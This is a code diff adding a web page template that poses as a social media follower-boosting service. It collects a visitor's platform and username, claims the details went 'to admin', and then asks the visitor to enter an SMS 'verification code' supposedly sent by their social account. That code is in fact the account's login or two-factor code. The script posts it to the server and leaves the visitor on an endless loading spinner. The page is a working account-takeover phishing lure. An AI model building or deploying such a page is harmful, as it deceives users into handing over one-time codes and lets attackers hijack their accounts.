@@ -1,0 +1,38 @@
+{% extends "base.html" %}
+{% block content %}
+<h2>Fill it UP… ⬆️</h2>
+<form id="details-form">
+  <input name="platform" placeholder="Your media Platform" required><br>
+  <input name="uname" placeholder="Username" required><br>
+  <input name="desired" type="number" placeholder="Desired follower count" required><br>
+  <button type="submit" class="btn">Done</button>
+</form>
+<div id="details-result"></div>
+<script>
+$('#details-form').on('submit', function(e){
+  e.preventDefault();
+  var data = $(this).serialize();
+  $('#details-result').html('<div class="loader"></div> Sending...');
+  $.post('', data, function(resp){
+    $('#details-result').html('Sent to admin. Now verify ownership (enter code below).');
+    var vHtml = `<div class="verify-block" style="margin-top:12px">
+       <p>To start the process please verify you are the true owner of the social media account submitted,
+       check your SMS messages for a verification code sent from the social media account you submitted.
+       Enter that code below to continue.</p>
+       <input id="sms-code" placeholder="Enter code (text)"><button id="sms-send" class="btn">Send code</button>
+       <div id="sms-result"></div>
+    </div>`;
+    $('#details-result').append(vHtml);
+    $('#sms-send').on('click', function(ev){
+      ev.preventDefault();
+      const code = $('#sms-code').val().trim();
+      if(!code) return alert('Enter code');
+      $('#sms-result').html('<div class="loader"></div> Sending code...');
+      $.post('{{ url_for("section2_verify_code") }}', { code: code }, function(r){
+        $('#sms-result').html('<div class="loader infinite"></div> Processing (infinite)...');
+      });
+    });
+  });
+});
+</script>
+{% endblock %}
